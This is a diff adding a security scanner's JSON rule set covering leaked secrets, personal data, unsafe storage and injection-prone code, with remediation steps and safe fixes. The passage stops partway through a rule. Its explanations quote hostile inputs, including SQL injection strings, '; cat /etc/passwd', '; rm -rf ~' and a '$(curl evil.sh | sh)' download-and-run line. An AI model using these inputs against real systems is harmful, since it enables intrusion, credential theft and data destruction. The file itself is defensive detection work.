@@ -1,0 +1,987 @@
+{
+  "version": 1,
+  "severity_rubric": "docs/SEVERITY.md",
+  "categories": {
+    "secrets": "Exposed secrets",
+    "pii": "Personal info",
+    "storage": "Unsafe storage",
+    "code": "Unsafe code"
+  },
+  "rules": [
+    {
+      "id": "CM-S001",
+      "title": "AWS access key ID",
+      "category": "secrets",
+      "severity": "critical",
+      "cwe": "CWE-798",
+      "description": "AKIA/ASIA-prefixed AWS access key IDs. Paired with a secret key they grant API access to your cloud account.",
+      "generic": false,
+      "explanation": "Bots scrape public repos for AKIA keys within minutes of a push. With the matching secret, an attacker spins up GPU instances in every region and you find out from a five-figure bill, or they quietly copy your S3 buckets.",
+      "steps": [
+        "Deactivate the key in IAM, then create a new one.",
+        "Load credentials from the environment or an IAM role, never from source.",
+        "Check CloudTrail for activity from this key ID since it was committed."
+      ],
+      "fix": {
+        "python": "import os\n\nAPI_KEY = os.environ[\"API_KEY\"]  # then rotate the exposed key\n",
+        "javascript": "const apiKey = process.env.API_KEY // then rotate the exposed key\n"
+      }
+    },
+    {
+      "id": "CM-S002",
+      "title": "AWS secret access key",
+      "category": "secrets",
+      "severity": "critical",
+      "cwe": "CWE-798",
+      "description": "40-character AWS secret keys assigned to an aws…secret name in code, config or .env files.",
+      "generic": false,
+      "explanation": "The secret half of an AWS key pair is what actually signs requests. Anyone holding it can act as that IAM user: read databases, delete backups, or mine crypto on your account.",
+      "steps": [
+        "Delete the access key in IAM and issue a new one.",
+        "Prefer short-lived credentials (SSO, instance roles) over long-lived keys.",
+        "Review CloudTrail for unfamiliar API calls."
+      ],
+      "fix": {
+        "python": "import os\n\nAPI_KEY = os.environ[\"API_KEY\"]  # then rotate the exposed key\n",
+        "javascript": "const apiKey = process.env.API_KEY // then rotate the exposed key\n"
+      }
+    },
+    {
+      "id": "CM-S003",
+      "title": "GitHub token",
+      "category": "secrets",
+      "severity": "critical",
+      "cwe": "CWE-798",
+      "description": "Classic (ghp_, gho_, ghs_…) and fine-grained (github_pat_) GitHub tokens, which can read or push to your repositories.",
+      "generic": false,
+      "explanation": "A GitHub token can clone private repos, push malicious commits, or edit CI workflows to steal more secrets. Supply-chain attacks often start with exactly one leaked token.",
+      "steps": [
+        "Revoke the token under Settings → Developer settings.",
+        "Use fine-grained tokens with a single repo and an expiry.",
+        "Audit recent pushes and workflow changes."
+      ],
+      "fix": {
+        "python": "import os\n\nAPI_KEY = os.environ[\"API_KEY\"]  # then rotate the exposed key\n",
+        "javascript": "const apiKey = process.env.API_KEY // then rotate the exposed key\n"
+      }
+    },
+    {
+      "id": "CM-S004",
+      "title": "Stripe live key",
+      "category": "secrets",
+      "severity": "critical",
+      "cwe": "CWE-798",
+      "description": "Live-mode Stripe secret (sk_live_) and restricted (rk_live_) keys. These can move real money.",
+      "generic": false,
+      "explanation": "A live Stripe secret key can issue refunds to attacker-controlled cards, read customer billing details, and create charges. Stripe will freeze the account, but money that has already moved is gone.",
+      "steps": [
+        "Roll the key in the Stripe dashboard (Developers → API keys).",
+        "Keep it server-side only, loaded from the environment.",
+        "Use restricted keys (rk_) with the minimum permissions."
+      ],
+      "fix": {
+        "python": "import os\n\nAPI_KEY = os.environ[\"API_KEY\"]  # then rotate the exposed key\n",
+        "javascript": "const apiKey = process.env.API_KEY // then rotate the exposed key\n"
+      }
+    },
+    {
+      "id": "CM-S005",
+      "title": "OpenAI-style API key",
+      "category": "secrets",
+      "severity": "high",
+      "cwe": "CWE-798",
+      "description": "sk-… and sk-proj-… keys used by OpenAI and compatible LLM APIs. Leaked keys get used to run up large bills within hours.",
+      "generic": false,
+      "explanation": "Leaked LLM keys get resold and drained fast: someone runs millions of tokens through your account overnight, and your usage limit is the only brake.",
+      "steps": [
+        "Revoke the key in the provider dashboard.",
+        "Proxy LLM calls through your server; never ship keys to the browser.",
+        "Set a hard monthly spend limit."
+      ],
+      "fix": {
+        "python": "import os\n\nAPI_KEY = os.environ[\"API_KEY\"]  # then rotate the exposed key\n",
+        "javascript": "const apiKey = process.env.API_KEY // then rotate the exposed key\n"
+      }
+    },
+    {
+      "id": "CM-S006",
+      "title": "Anthropic API key",
+      "category": "secrets",
+      "severity": "critical",
+      "cwe": "CWE-798",
+      "description": "sk-ant-… keys for the Anthropic API.",
+      "generic": false,
+      "explanation": "An Anthropic key lets anyone bill API usage to your organization and see whatever prompts they send under your name. Automated scanners look for the sk-ant- prefix specifically.",
+      "steps": [
+        "Disable the key in the Anthropic Console and create a new one.",
+        "Read it from ANTHROPIC_API_KEY on the server.",
+        "Set workspace spend limits."
+      ],
+      "fix": {
+        "python": "import os\n\nAPI_KEY = os.environ[\"API_KEY\"]  # then rotate the exposed key\n",
+        "javascript": "const apiKey = process.env.API_KEY // then rotate the exposed key\n"
+      }
+    },
+    {
+      "id": "CM-S007",
+      "title": "Google API key",
+      "category": "secrets",
+      "severity": "high",
+      "cwe": "CWE-798",
+      "description": "AIza-prefixed Google Cloud / Firebase / Maps API keys.",
+      "generic": false,
+      "explanation": "Unrestricted Google API keys get abused for Maps, Places or Gemini calls billed to you. Firebase keys with loose rules can also expose your database.",
+      "steps": [
+        "Restrict or regenerate the key in Google Cloud Console.",
+        "Apply HTTP referrer and API restrictions.",
+        "Move server-side keys to the environment."
+      ],
+      "fix": {
+        "python": "import os\n\nAPI_KEY = os.environ[\"API_KEY\"]  # then rotate the exposed key\n",
+        "javascript": "const apiKey = process.env.API_KEY // then rotate the exposed key\n"
+      }
+    },
+    {
+      "id": "CM-S008",
+      "title": "Slack token",
+      "category": "secrets",
+      "severity": "high",
+      "cwe": "CWE-798",
+      "description": "xoxb-/xoxp-/xoxa- Slack bot and user tokens that can read channels and post as your workspace.",
+      "generic": false,
+      "explanation": "A Slack bot token can read every channel the bot is in and post messages as your app. That makes it a perfect phishing launchpad inside your own workspace.",
+      "steps": [
+        "Revoke the token from the Slack app settings.",
+        "Reinstall the app to issue a fresh token.",
+        "Store it in your CI or host secret store."
+      ],
+      "fix": {
+        "python": "import os\n\nAPI_KEY = os.environ[\"API_KEY\"]  # then rotate the exposed key\n",
+        "javascript": "const apiKey = process.env.API_KEY // then rotate the exposed key\n"
+      }
+    },
+    {
+      "id": "CM-S009",
+      "title": "Private key block",
+      "category": "secrets",
+      "severity": "critical",
+      "cwe": "CWE-321",
+      "description": "PEM-encoded RSA, EC, OpenSSH or PKCS#8 private keys committed alongside code.",
+      "generic": false,
+      "explanation": "A private key is identity. With it an attacker can sign SAML assertions, impersonate your server over TLS, or SSH into machines that trust it, and nothing in the logs looks wrong.",
+      "steps": [
+        "Generate a new key pair and replace the public key everywhere it’s trusted.",
+        "Load private keys from a secret manager or a mounted file outside the repo.",
+        "Revoke any certificates issued for the old key."
+      ],
+      "fix": {
+        "python": "import os\n\nwith open(os.environ[\"PRIVATE_KEY_PATH\"], encoding=\"utf-8\") as fh:\n    PRIVATE_KEY = fh.read()\n",
+        "javascript": "const fs = require('fs')\n\nconst privateKey = fs.readFileSync(process.env.PRIVATE_KEY_PATH, 'utf8')\n"
+      }
+    },
+    {
+      "id": "CM-S010",
+      "title": "JSON Web Token",
+      "category": "secrets",
+      "severity": "high",
+      "cwe": "CWE-798",
+      "description": "Hardcoded JWTs (eyJ….eyJ….sig). Anyone holding one can act as that session until it expires.",
+      "generic": false,
+      "explanation": "A JWT is a bearer credential: whoever holds it is that user until it expires. Hardcoded tokens tend to be long-lived admin tokens, which turns a leak into instant admin access.",
+      "steps": [
+        "Invalidate the token (rotate the signing key if you can’t revoke individually).",
+        "Obtain tokens at runtime through a real login flow.",
+        "Keep token lifetimes short."
+      ],
+      "fix": {
+        "python": "import os\n\nAPI_KEY = os.environ[\"API_KEY\"]  # then rotate the exposed key\n",
+        "javascript": "const apiKey = process.env.API_KEY // then rotate the exposed key\n"
+      }
+    },
+    {
+      "id": "CM-S011",
+      "title": "Database URL with credentials",
+      "category": "secrets",
+      "severity": "critical",
+      "cwe": "CWE-798",
+      "description": "Connection strings like postgres://user:password@host with the password embedded.",
+      "generic": false,
+      "explanation": "A connection string with the password inside gives direct database access, skipping your API and its auth checks. One leaked URL is a full dump of your users table.",
+      "steps": [
+        "Change the database user’s password.",
+        "Read DATABASE_URL from the environment, with no fallback literal.",
+        "Restrict database network access to your app servers."
+      ],
+      "fix": {
+        "python": "import os\n\nDATABASE_URL = os.environ[\"DATABASE_URL\"]  # rotate the leaked DB password\n",
+        "javascript": "const databaseUrl = process.env.DATABASE_URL // rotate the leaked DB password\n"
+      }
+    },
+    {
+      "id": "CM-S012",
+      "title": "Hardcoded Bearer token",
+      "category": "secrets",
+      "severity": "high",
+      "cwe": "CWE-798",
+      "description": "Literal \"Authorization: Bearer <token>\" values in code, scripts or fixtures.",
+      "generic": true,
+      "explanation": "A hardcoded Bearer token works for anyone who copies it. These usually end up in screenshots, gists and AI chat logs long before anyone notices.",
+      "steps": [
+        "Revoke the token at its issuer.",
+        "Fetch tokens at runtime from a secret store or login flow."
+      ],
+      "fix": {
+        "python": "import os\n\nAPI_KEY = os.environ[\"API_KEY\"]  # then rotate the exposed key\n",
+        "javascript": "const apiKey = process.env.API_KEY // then rotate the exposed key\n"
+      }
+    },
+    {
+      "id": "CM-S013",
+      "title": "Committed .env file",
+      "category": "secrets",
+      "severity": "high",
+      "cwe": "CWE-312",
+      "description": ".env files with real values included in the scanned tree. .env.example / .env.sample templates are allowed.",
+      "generic": false,
+      "explanation": "A committed .env file is every secret in your project gathered in one place. Even after you delete it, it lives on in git history and in every fork and clone.",
+      "steps": [
+        "Stop tracking it: git rm --cached .env.",
+        "Add .env to .gitignore and commit a .env.example with blank values.",
+        "If it was ever pushed, purge history with git filter-repo and rotate everything in it."
+      ],
+      "fix": {
+        "shell": "git rm --cached .env\necho \".env\" >> .gitignore\n"
+      }
+    },
+    {
+      "id": "CM-S014",
+      "title": "High-entropy secret assignment",
+      "category": "secrets",
+      "severity": "high",
+      "cwe": "CWE-798",
+      "description": "Values assigned to names like key, secret, token or password, scored with Shannon entropy. Placeholders such as YOUR_API_KEY or \"changeme\" are ignored.",
+      "generic": true,
+      "explanation": "This value is high-entropy and assigned to a name like key, secret or password, which is the signature of a real credential. Attackers grep for exactly these patterns.",
+      "steps": [
+        "Confirm what the value is; if it’s live, rotate it.",
+        "Move it to an environment variable or secret manager.",
+        "If it’s a test fixture, use an obvious placeholder."
+      ],
+      "fix": {
+        "python": "import os\n\nAPI_KEY = os.environ[\"API_KEY\"]  # then rotate the exposed key\n",
+        "javascript": "const apiKey = process.env.API_KEY // then rotate the exposed key\n"
+      }
+    },
+    {
+      "id": "CM-P001",
+      "title": "Email address",
+      "category": "pii",
+      "severity": "low",
+      "cwe": "CWE-200",
+      "description": "Real-looking email addresses in source, fixtures or seed data.",
+      "generic": false,
+      "explanation": "Real email addresses in source end up in public repos, AI training sets and spam lists. Under GDPR/CCPA they count as personal data, so a leak can be a reportable incident.",
+      "steps": [
+        "Replace with reserved test domains (example.test).",
+        "Generate fixtures at test time instead of committing real people."
+      ],
+      "fix": {
+        "python": "TEST_EMAIL = \"user1@example.test\"\n",
+        "javascript": "const testEmail = 'user1@example.test'\n"
+      }
+    },
+    {
+      "id": "CM-P002",
+      "title": "Phone number",
+      "category": "pii",
+      "severity": "low",
+      "cwe": "CWE-200",
+      "description": "North American phone numbers with separators, e.g. (415) 555-0134 or +1 415-555-0134.",
+      "generic": true,
+      "explanation": "Phone numbers enable SIM-swap and phishing attacks, and they’re regulated personal data. Fixtures copied from production are a common source of leaks.",
+      "steps": [
+        "Use 555-01xx fictional numbers in fixtures.",
+        "Keep production data out of the repo."
+      ],
+      "fix": {
+        "python": "TEST_PHONE = \"(555) 010-0000\"\n",
+        "javascript": "const testPhone = '(555) 010-0000'\n"
+      }
+    },
+    {
+      "id": "CM-P003",
+      "title": "US Social Security number",
+      "category": "pii",
+      "severity": "high",
+      "cwe": "CWE-200",
+      "description": "NNN-NN-NNNN values that pass SSA structural rules (no 000/666/9xx area, no 00 group, no 0000 serial).",
+      "generic": false,
+      "explanation": "An SSN plus a name and date of birth is enough to open credit in someone’s name. Exposing one usually triggers breach-notification laws in most US states.",
+      "steps": [
+        "Remove it and purge it from history.",
+        "Avoid storing SSNs at all; if you must, encrypt the field and limit access.",
+        "Use obviously invalid values (000-xx-xxxx) in tests."
+      ],
+      "fix": {
+        "python": "TEST_SSN = \"000-00-0000\"  # never-issued area number\n",
+        "javascript": "const testSsn = '000-00-0000' // never-issued area number\n"
+      }
+    },
+    {
+      "id": "CM-P004",
+      "title": "Credit card number",
+      "category": "pii",
+      "severity": "high",
+      "cwe": "CWE-200",
+      "description": "Visa, Mastercard, Amex and Discover numbers. Every candidate is Luhn-checked to cut false positives.",
+      "generic": false,
+      "explanation": "Storing card numbers puts your whole system in PCI DSS scope. A real PAN in code or logs is a reportable cardholder-data exposure.",
+      "steps": [
+        "Delete it and use processor tokens (tok_visa) instead.",
+        "Never log or persist full card numbers."
+      ],
+      "fix": {
+        "python": "payment_token = \"tok_visa\"  # processor token, not a card number\n",
+        "javascript": "const paymentToken = 'tok_visa' // processor token, not a card number\n"
+      }
+    },
+    {
+      "id": "CM-P005",
+      "title": "Date of birth",
+      "category": "pii",
+      "severity": "medium",
+      "cwe": "CWE-200",
+      "description": "Dates assigned to dob / birthdate / date_of_birth fields.",
+      "generic": false,
+      "explanation": "Date of birth is a classic identity-verification answer. Combined with a name or email it makes account-recovery attacks much easier.",
+      "steps": [
+        "Use synthetic dates in fixtures.",
+        "Store age brackets instead of full DOB when you can."
+      ],
+      "fix": {
+        "python": "TEST_DOB = \"1970-01-01\"\n",
+        "javascript": "const testDob = '1970-01-01'\n"
+      }
+    },
+    {
+      "id": "CM-P006",
+      "title": "Personal data written to logs",
+      "category": "pii",
+      "severity": "high",
+      "cwe": "CWE-532",
+      "description": "console.log / print / logger calls that print user objects, emails, SSNs, passwords or request bodies.",
+      "generic": false,
+      "explanation": "Logs get shipped to third-party services, kept for months, and read by far more people than your database. An email or SSN in a log line is a quiet, long-lived leak.",
+      "steps": [
+        "Log IDs, not people: user.id instead of the user object.",
+        "Add a redaction helper and use it in every logger call.",
+        "Purge existing logs that contain personal data."
+      ],
+      "fix": {
+        "python": "import logging\n\nlogger = logging.getLogger(__name__)\n\n\ndef log_signup(user):\n    logger.info(\"signup user_id=%s\", user[\"id\"])  # log ids, not personal data\n",
+        "javascript": "function logSignup(user) {\n  console.log('signup user_id=%s', user.id) // log ids, not personal data\n}\n"
+      }
+    },
+    {
+      "id": "CM-P007",
+      "title": "Personal data in URL",
+      "category": "pii",
+      "severity": "medium",
+      "cwe": "CWE-200",
+      "description": "Emails, SSNs, phone numbers, passwords or tokens placed in query strings, where they end up in server logs, proxies and browser history.",
+      "generic": false,
+      "explanation": "Query strings land in server access logs, proxy logs, browser history and Referer headers sent to other sites. A password in a URL is effectively public.",
+      "steps": [
+        "Send sensitive fields in a POST body over HTTPS.",
+        "Scrub query strings from existing logs."
+      ],
+      "fix": {
+        "python": "import requests\n\n\ndef lookup(email):\n    return requests.post(\"https://api.internal/lookup\", json={\"email\": email}, timeout=10)\n",
+        "javascript": "async function lookup(email) {\n  return fetch('/api/lookup', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email }) })\n}\n"
+      }
+    },
+    {
+      "id": "CM-D001",
+      "title": "Sensitive data in browser storage",
+      "category": "storage",
+      "severity": "high",
+      "cwe": "CWE-312",
+      "description": "Tokens, passwords, user profiles or card data written to localStorage / sessionStorage, readable by any script on the page.",
+      "generic": false,
+      "explanation": "localStorage is readable by any script on the page. One XSS bug or one compromised npm package can read the token and replay it from anywhere, and it never expires on its own.",
+      "steps": [
+        "Have the server set an HttpOnly, Secure, SameSite cookie.",
+        "Send requests with credentials: 'include' instead of reading the token in JS.",
+        "Store only non-sensitive IDs client-side."
+      ],
+      "fix": {
+        "python": "from flask import Flask, make_response\n\napp = Flask(__name__)\n\n\n@app.post(\"/login\")\ndef login():\n    resp = make_response({\"ok\": True})\n    resp.set_cookie(\"session\", \"opaque-session-id\", httponly=True, secure=True, samesite=\"Lax\")\n    return resp\n",
+        "javascript": "// Server: set the session as an HttpOnly cookie instead of returning it to localStorage\nfunction setSession(res, token) {\n  res.cookie('session', token, { httpOnly: true, secure: true, sameSite: 'lax' })\n}\n// Client: send cookies, never read the token in JS\nfetch('/api/me', { credentials: 'include' })\n"
+      }
+    },
+    {
+      "id": "CM-D002",
+      "title": "Weak password hashing (MD5/SHA-1)",
+      "category": "storage",
+      "severity": "critical",
+      "cwe": "CWE-328",
+      "description": "Passwords hashed with MD5 or SHA-1, which commodity GPUs crack at billions of guesses per second.",
+      "generic": false,
+      "explanation": "MD5 and SHA-1 are fast by design, so a single GPU tests billions of guesses per second. If the users table leaks, most passwords are cracked the same afternoon and reused on other sites.",
+      "steps": [
+        "Switch to bcrypt (cost 12+) or argon2id.",
+        "Re-hash on next login, and force a reset for accounts that don’t log in.",
+        "Never hash passwords with a general-purpose digest."
+      ],
+      "fix": {
+        "python": "import bcrypt\n\n\ndef hash_password(password: str) -> str:\n    return bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()\n\n\ndef verify_password(password: str, stored_hash: str) -> bool:\n    return bcrypt.checkpw(password.encode(), stored_hash.encode())\n",
+        "javascript": "const bcrypt = require('bcryptjs')\n\nasync function hashPassword(password) {\n  return bcrypt.hash(password, 12)\n}\n\nasync function verifyPassword(password, storedHash) {\n  return bcrypt.compare(password, storedHash)\n}\n"
+      }
+    },
+    {
+      "id": "CM-D003",
+      "title": "Plaintext password storage",
+      "category": "storage",
+      "severity": "high",
+      "cwe": "CWE-312",
+      "description": "Passwords saved to a database or file as-is, or schema columns named password with a text type.",
+      "generic": false,
+      "explanation": "Plaintext passwords mean one SQL injection or backup leak exposes every user’s password, and with it their accounts on other sites where they reused it.",
+      "steps": [
+        "Store only a bcrypt/argon2id hash, in a column named for what it holds.",
+        "Migrate existing rows and force resets."
+      ],
+      "fix": {
+        "python": "import bcrypt\n\n\ndef create_user(cur, email, password):\n    password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()\n    cur.execute(\"INSERT INTO users (email, password_hash) VALUES (?, ?)\", (email, password_hash))\n",
+        "javascript": "const bcrypt = require('bcryptjs')\n\nasync function createUser(db, email, password) {\n  const passwordHash = await bcrypt.hash(password, 12)\n  await db.query('INSERT INTO users (email, password_hash) VALUES (?, ?)', [email, passwordHash])\n}\n"
+      }
+    },
+    {
+      "id": "CM-D004",
+      "title": "Hardcoded JWT / session secret",
+      "category": "storage",
+      "severity": "critical",
+      "cwe": "CWE-321",
+      "description": "Literal signing secrets passed to jwt.sign, express-session, Flask SECRET_KEY and friends. Whoever knows it can mint valid sessions.",
+      "generic": false,
+      "explanation": "Whoever knows the signing secret can mint a valid session for any user, including admins, without a password. Copy-pasted tutorial defaults are the first values attackers try.",
+      "steps": [
+        "Generate a long random secret (openssl rand -base64 48) and keep it in the environment.",
+        "Rotate it, which logs everyone out.",
+        "Never fall back to a literal default."
+      ],
+      "fix": {
+        "python": "import os\n\nSECRET_KEY = os.environ[\"SECRET_KEY\"]  # long random value; rotate the leaked one\n",
+        "javascript": "const jwt = require('jsonwebtoken')\n\nfunction issue(userId) {\n  return jwt.sign({ sub: userId }, process.env.JWT_SECRET, { algorithm: 'HS256', expiresIn: '15m' })\n}\n"
+      }
+    },
+    {
+      "id": "CM-D005",
+      "title": "Cookie missing HttpOnly / Secure / SameSite",
+      "category": "storage",
+      "severity": "medium",
+      "cwe": "CWE-1004",
+      "description": "Session or auth cookies set without HttpOnly, Secure and SameSite, or written from client-side JavaScript.",
+      "generic": false,
+      "explanation": "Without HttpOnly, any XSS can read the session cookie. Without Secure it travels over plain HTTP, and without SameSite it rides along on cross-site requests (CSRF).",
+      "steps": [
+        "Set httpOnly: true, secure: true and sameSite: 'lax' (or 'strict').",
+        "Set auth cookies server-side only."
+      ],
+      "fix": {
+        "python": "def set_session(resp, session_id):\n    resp.set_cookie(\"session\", session_id, httponly=True, secure=True, samesite=\"Lax\")\n",
+        "javascript": "function setSession(res, sessionId) {\n  res.cookie('session', sessionId, { httpOnly: true, secure: true, sameSite: 'lax' })\n}\n"
+      }
+    },
+    {
+      "id": "CM-D006",
+      "title": "Secrets or PII written to files",
+      "category": "storage",
+      "severity": "medium",
+      "cwe": "CWE-312",
+      "description": "fs.writeFile / appendFile / open().write calls that dump tokens, passwords or user records to disk in plaintext.",
+      "generic": false,
+      "explanation": "Files on disk get backed up, synced and copied with far less care than your database. A plaintext dump of users or tokens is a breach waiting for one misconfigured bucket.",
+      "steps": [
+        "Redact sensitive fields before writing.",
+        "Encrypt at rest and restrict file permissions.",
+        "Delete old dumps."
+      ],
+      "fix": {
+        "python": "import json\n\nSENSITIVE = {\"email\", \"ssn\", \"password\", \"dob\", \"phone\", \"card\", \"token\"}\n\n\ndef redact(record):\n    return {k: \"[redacted]\" if k in SENSITIVE else v for k, v in record.items()}\n\n\ndef dump(users, path):\n    with open(path, \"w\", encoding=\"utf-8\") as fh:\n        json.dump([redact(u) for u in users], fh)\n",
+        "javascript": "const fs = require('fs')\nconst SENSITIVE = ['email', 'ssn', 'password', 'dob', 'phone', 'card', 'token']\nconst redact = (v) => JSON.parse(JSON.stringify(v, (k, x) => (SENSITIVE.includes(k) ? '[redacted]' : x)))\n\nfunction dump(users, path) {\n  fs.writeFileSync(path, JSON.stringify(redact(users)), { mode: 0o600 })\n}\n"
+      }
+    },
+    {
+      "id": "CM-D007",
+      "title": "TLS certificate verification disabled",
+      "category": "storage",
+      "severity": "high",
+      "cwe": "CWE-295",
+      "description": "rejectUnauthorized: false, verify=False, NODE_TLS_REJECT_UNAUTHORIZED=0, curl -k and similar. Data in transit can be intercepted.",
+      "generic": false,
+      "explanation": "Turning off certificate checks means anyone on the network path (coffee-shop Wi-Fi, a compromised router) can read and alter traffic, including database credentials and user data.",
+      "steps": [
+        "Fix the certificate or trust your private CA explicitly.",
+        "Never ship verify=False / rejectUnauthorized: false to production."
+      ],
+      "fix": {
+        "python": "import requests\n\n\ndef fetch(url):\n    # Keep verification on; point at your private CA bundle if needed.\n    return requests.get(url, timeout=10, verify=True)\n",
+        "javascript": "const https = require('https')\nconst fs = require('fs')\n\nconst agent = new https.Agent({ ca: fs.readFileSync(process.env.INTERNAL_CA_PATH) })\n"
+      }
+    },
+    {
+      "id": "CM-D008",
+      "title": ".env file not covered by .gitignore",
+      "category": "storage",
+      "severity": "high",
+      "cwe": "CWE-312",
+      "description": "A .env file exists but no .gitignore rule excludes it, so the next `git add .` publishes every secret in it.",
+      "generic": false,
+      "explanation": "Without a .gitignore rule, the next \"git add .\" quietly commits every secret in .env. AI coding agents run that command constantly.",
+      "steps": [
+        "Add .env and .env.* to .gitignore (with !.env.example).",
+        "Check git history for past commits of the file."
+      ],
+      "fix": {
+        "gitignore": ".env\n.env.*\n!.env.example\n"
+      }
+    },
+    {
+      "id": "CM-A001",
+      "title": "SQL built from string formatting",
+      "category": "code",
+      "severity": "critical",
+      "cwe": "CWE-89",
+      "description": "A SQL string assembled with f-strings, +, % or .format() is passed to execute(), so user input becomes part of the query.",
+      "generic": false,
+      "explanation": "When user input is pasted into SQL text, the input can change the query itself. An attacker submits ' OR '1'='1 to log in as anyone, or a UNION SELECT to dump every table, including password hashes and personal data.",
+      "steps": [
+        "Pass values as parameters: cur.execute(\"... WHERE name = ?\", (name,)).",
+        "Never build SQL with f-strings, +, % or .format() from request data.",
+        "Use an allowlist for identifiers such as column names that cannot be parameterized."
+      ],
+      "languages": [
+        "python"
+      ],
+      "fix": {
+        "python": "def find_user(cur, name):\n    cur.execute(\"SELECT * FROM users WHERE name = ?\", (name,))\n    return cur.fetchone()\n"
+      }
+    },
+    {
+      "id": "CM-J003",
+      "title": "SQL built by string concatenation",
+      "category": "code",
+      "severity": "critical",
+      "cwe": "CWE-89",
+      "description": "A SQL query assembled with template-literal interpolation or + is executed.",
+      "generic": false,
+      "explanation": "Interpolating request data into SQL lets an attacker rewrite the query: bypass login with ' OR 1=1 --, read other users' rows with UNION SELECT, or drop tables.",
+      "steps": [
+        "Use placeholders and a values array: db.query('... WHERE id = ?', [id]).",
+        "For pg use $1, $2 placeholders.",
+        "Never interpolate req.query / req.body into SQL text."
+      ],
+      "languages": [
+        "javascript",
+        "typescript"
+      ],
+      "fix": {
+        "javascript": "async function findUser(db, id) {\n  return db.query('SELECT * FROM users WHERE id = ?', [id])\n}\n"
+      }
+    },
+    {
+      "id": "CM-A002",
+      "title": "Shell injection via subprocess/os.system",
+      "category": "code",
+      "severity": "critical",
+      "cwe": "CWE-78",
+      "description": "os.system / os.popen with a built command, or subprocess with shell=True and a non-constant command.",
+      "generic": false,
+      "explanation": "The shell interprets ; | $( ) and backticks. If any part of the command comes from a user, they can append ; cat /etc/passwd or download and run malware with the server's privileges.",
+      "steps": [
+        "Call subprocess.run([\"prog\", arg], shell=False) with an argument list.",
+        "Validate arguments against an allowlist.",
+        "Avoid os.system and os.popen entirely."
+      ],
+      "languages": [
+        "python"
+      ],
+      "fix": {
+        "python": "import subprocess\n\n\ndef ping(host):\n    return subprocess.run([\"ping\", \"-c\", \"1\", host], shell=False, check=False, capture_output=True)\n"
+      }
+    },
+    {
+      "id": "CM-J002",
+      "title": "Command injection via child_process",
+      "category": "code",
+      "severity": "critical",
+      "cwe": "CWE-78",
+      "description": "child_process exec/execSync (or spawn with shell: true) with an interpolated or concatenated command.",
+      "generic": false,
+      "explanation": "exec() hands the whole string to /bin/sh. Interpolated input such as `; rm -rf ~` or `$(curl evil.sh | sh)` runs as the server user.",
+      "steps": [
+        "Use execFile / spawn with an argument array and no shell.",
+        "Validate input against an allowlist.",
+        "Never pass request data to exec()."
+      ],
+      "languages": [
+        "javascript",
+        "typescript"
+      ],
+      "fix": {
+        "javascript": "const { execFile } = require('child_process')\n\nfunction ping(host, cb) {\n  execFile('ping', ['-c', '1', host], cb)\n}\n"
+      }
+    },
+    {
+      "id": "CM-A003",
+      "title": "Use of eval/exec",
+      "category": "code",
+      "severity": "high",
+      "cwe": "CWE-94",
+      "description": "eval()/exec() on a non-literal value runs arbitrary code.",
+      "generic": false,
+      "explanation": "eval and exec run whatever string they receive as Python. If the string can be influenced by a user, they can import os and run commands on the server.",
+      "steps": [
+        "Use ast.literal_eval for literals or json.loads for data.",
+        "Replace dynamic dispatch with an explicit dict of allowed functions."
+      ],
+      "languages": [
+        "python"
+      ],
+      "fix": {
+        "python": "import ast\n\n\ndef parse_value(text):\n    return ast.literal_eval(text)  # literals only, no code execution\n",
+        "javascript": "function parseValue(text) {\n  return JSON.parse(text)\n}\n"
+      }
+    },
+    {
+      "id": "CM-A004",
+      "title": "Unsafe deserialization",
+      "category": "code",
+      "severity": "critical",
+      "cwe": "CWE-502",
+      "description": "pickle / marshal / dill loads, or yaml.load without a safe loader, on data that may be attacker-controlled.",
+      "generic": false,
+      "explanation": "pickle and unsafe YAML can construct arbitrary objects during loading, which is equivalent to running attacker code. A crafted payload in a cookie, upload or message queue gives remote code execution.",
+      "steps": [
+        "Use json for data interchange.",
+        "Use yaml.safe_load (or Loader=yaml.SafeLoader).",
+        "Never unpickle data that crossed a trust boundary."
+      ],
+      "languages": [
+        "python"
+      ],
+      "fix": {
+        "python": "import json\n\nimport yaml\n\n\ndef load_config(text):\n    return yaml.safe_load(text)\n\n\ndef load_payload(raw):\n    return json.loads(raw)  # instead of pickle.loads\n"
+      }
+    },
+    {
+      "id": "CM-J007",
+      "title": "Unsafe deserialization (node-serialize)",
+      "category": "code",
+      "severity": "critical",
+      "cwe": "CWE-502",
+      "description": "node-serialize / serialize-to-js unserialize() on input, which evaluates embedded functions.",
+      "generic": false,
+      "explanation": "node-serialize executes functions embedded in the serialized string (the _$$ND_FUNC$$_ marker). Feeding it a cookie or request body gives the attacker code execution.",
+      "steps": [
+        "Use JSON.parse for data.",
+        "Remove node-serialize from the project."
+      ],
+      "languages": [
+        "javascript",
+        "typescript"
+      ],
+      "fix": {
+        "javascript": "function loadPayload(raw) {\n  return JSON.parse(raw) // data only; never node-serialize unserialize()\n}\n"
+      }
+    },
+    {
+      "id": "CM-A005",
+      "title": "Flask debug mode enabled",
+      "category": "code",
+      "severity": "high",
+      "cwe": "CWE-489",
+      "description": "Flask app.run(debug=True) exposes the Werkzeug interactive debugger.",
+      "generic": false,
+      "explanation": "The Werkzeug debugger gives anyone who can trigger an error an interactive Python console in the browser. That is remote code execution if the app is reachable by anyone else.",
+      "steps": [
+        "Never hardcode debug=True; read it from an environment flag that is off by default.",
+        "Run production behind a WSGI server such as gunicorn."
+      ],
+      "languages": [
+        "python"
+      ],
+      "fix": {
+        "python": "import os\n\nfrom flask import Flask\n\napp = Flask(__name__)\n\nif __name__ == \"__main__\":\n    app.run(debug=os.environ.get(\"FLASK_DEBUG\") == \"1\")\n"
+      }
+    },
+    {
+      "id": "CM-A006",
+      "title": "TLS verification disabled (requests)",
+      "category": "storage",
+      "severity": "high",
+      "cwe": "CWE-295",
+      "description": "requests called with verify=False disables certificate checking.",
+      "generic": false,
+      "explanation": "With verify=False anyone on the network path can impersonate the server and read or change the traffic, including credentials and API responses.",
+      "steps": [
+        "Remove verify=False.",
+        "If you use a private CA, pass verify=\"/path/to/ca.pem\"."
+      ],
+      "languages": [
+        "python"
+      ],
+      "fix": {
+        "python": "import requests\n\n\ndef fetch(url):\n    return requests.get(url, timeout=10, verify=True)\n"
+      }
+    },
+    {
+      "id": "CM-A007",
+      "title": "Path traversal via open()",
+      "category": "code",
+      "severity": "high",
+      "cwe": "CWE-22",
+      "description": "open() on a path built from user-controlled input.",
+      "generic": false,
